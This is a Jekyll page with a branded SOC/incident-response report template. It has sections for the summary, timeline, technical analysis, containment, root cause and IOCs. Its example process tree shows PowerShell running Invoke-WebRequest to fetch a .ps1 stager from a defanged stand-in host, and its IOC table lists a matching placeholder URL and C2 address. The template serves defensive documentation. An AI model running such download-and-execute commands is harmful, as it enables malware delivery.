---
layout: page
title: "SOC Analyst Report Template"
description: "Reusable SOC/IR report format for documenting security incidents — branded for Brandon Love."
permalink: /reports/soc-analyst-template/
image: /assets/images/og-default.png
---

<!-- Brand banner -->
<div style="display:flex;align-items:center;gap:16px;padding:18px 20px;border-radius:16px;background:linear-gradient(135deg,#0b1220,#121a2a 55%,#1e2a44);color:#e8eefc;border:1px solid rgba(255,255,255,.06);margin-bottom:24px;">
  <img src="/assets/images/brand/brandmark.png" alt="Brandon Love brand" style="width:56px;height:56px;border-radius:12px;object-fit:cover;" onerror="this.style.display='none'">
  <div>
    <div style="font-weight:700;font-size:22px;letter-spacing:.2px;">Brandon Love · Security Engineering & DFIR</div>
    <div style="opacity:.85;font-size:14px;">SOC/IR Report Template — Markdown, Jekyll-ready</div>
  </div>
</div>

> **How to use:** Copy this file into your repo (suggested path: `/reports/soc-analyst-template.md`). It renders as a page at `/reports/soc-analyst-template/`. Update the logo at `/assets/images/brand/brandmark.png` or remove the `<img>` tag above.

---

# 🧾 SOC Analyst Report Template

Use this template to document investigations, incidents, and alerts handled by your SOC or blue team. The sections are arranged for quick exec consumption first, then deep technical evidence.

---

## 1) Executive Summary
> _One paragraph. Who/what/when/impact/containment._  
> Example: On **{ "{" } "now" | date: "%Y-%m-%d" { "}" }**, suspicious PowerShell activity was detected on host `HOSTNAME`. Investigation confirmed the activity was malicious; containment actions prevented further impact. No lateral movement observed.

---

## 2) Incident Details
| Field | Description |
|------|-------------|
| **Incident ID** | IR-{ "{" } "now" | date: "%Y%m%d" { "}" }-XXX |
| **Analyst** | |
| **Date/Time Detected** |  |
| **Severity** | Low / Medium / High / Critical |
| **Category** | Malware / Phishing / Privilege Escalation / Data Exfiltration / Insider |
| **Detection Source** | EDR / SIEM / IDS / Email Gateway |
| **Business Impact** | None / Minimal / Moderate / Severe (describe briefly) |
| **Systems Affected** |  |
| **Users Involved** |  |

---

## 3) Timeline of Events (CST)
| Time | Event |
|-----:|-------|
| HH:MM | Detection triggered |
| HH:MM | Analyst investigation started |
| HH:MM | Containment performed |
| HH:MM | Root cause identified |
| HH:MM | Incident resolved |

---

## 4) Technical Analysis
**Process Tree:**  
```
explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.ps1
```
**File Hashes:**  
- SHA256: `<insert>`  
- MD5 (optional): `<insert>`

**Network Indicators:**  
- Outbound connection to `<IP:PORT>`  
- Domain: `<domain.com>`

**Host Artifacts:**  
- Persistence: `<none / registry run key / scheduled task>`  
- Notable events: Windows 4104/4688/Sysmon EID 1, 3, 7, 10…  
- Screenshots / excerpts linked in Appendices

**MITRE ATT&CK:**  
- T1059.001 – PowerShell  
- T1105 – Ingress Tool Transfer  
- T1071 – Application Layer Protocol

---

## 5) Containment & Eradication (Checked = Completed)
- [ ] Isolated affected host  
- [ ] Quarantined payload / deleted artifacts  
- [ ] Revoked creds / invalidated tokens  
- [ ] Blocked IPs/domains/signatures across controls  
- [ ] Removed persistence mechanisms  
- [ ] Closed attacker sessions

---

## 6) Recovery & Verification
- [ ] Restored network access after validation  
- [ ] Full AV/EDR scan clean  
- [ ] Patched vulnerable components  
- [ ] Monitored for reoccurrence for **X** hours/days

---

## 7) Root Cause
> _Explain the initiating action / vector. Add supporting evidence._  
> Example: User executed a phishing attachment (`invoice.docm`) that downloaded and executed a PowerShell stager.

---

## 8) Recommendations
- Enforce constrained PowerShell + enhanced logging (4104)  
- Phishing awareness refresher for affected team  
- SIEM/EDR tuning for suspicious command-line patterns  
- URL/IP filtering for high-risk categories  
- MFA/Conditional Access review (where relevant)

---

## 9) Indicators of Compromise (IOCs)
| Type | Value | Description |
|------|------|-------------|
| IP | 45.77.xx.xx | Suspected C2 |
| File Hash | `abcd1234...` | Malicious payload |
| URL | `http://45.77.xx.xx/file.ps1` | Download location |
| Domain | `maliciousdomain.com` | Attacker infra |

---

## 10) Appendices (Evidence)
- Screenshots of alert console  
- Sysmon/Windows Event excerpts  
- PowerShell transcripts  
- VirusTotal / sandbox results  
- Packet captures (if applicable)

---

<small style="opacity:.7">© 2025 Brandon Love. Last updated: { "{" } "now" | date: "%Y-%m-%d %H:%M %Z" { "}" }.</small>

<!-- Minimal in-page styles to match the site's aesthetic -->
<style>
  table { border-collapse: collapse; width: 100%; }
  th, td { border: 1px solid #e3e8f5; padding: 8px 10px; }
  thead th { background: #0b1220; color: #e8eefc; }
  code { background:#0f172a; color:#e2e8f0; padding:2px 6px; border-radius:6px; }
  pre code { display:block; padding:12px 14px; }
  h1, h2, h3 { scroll-margin-top: 84px; }
  hr { border:0; border-top:1px solid #e3e8f5; margin: 24px 0; }
  .btn { display:inline-block;padding:10px 14px;border-radius:10px;border:1px solid #dbe4ff;text-decoration:none; }
</style>
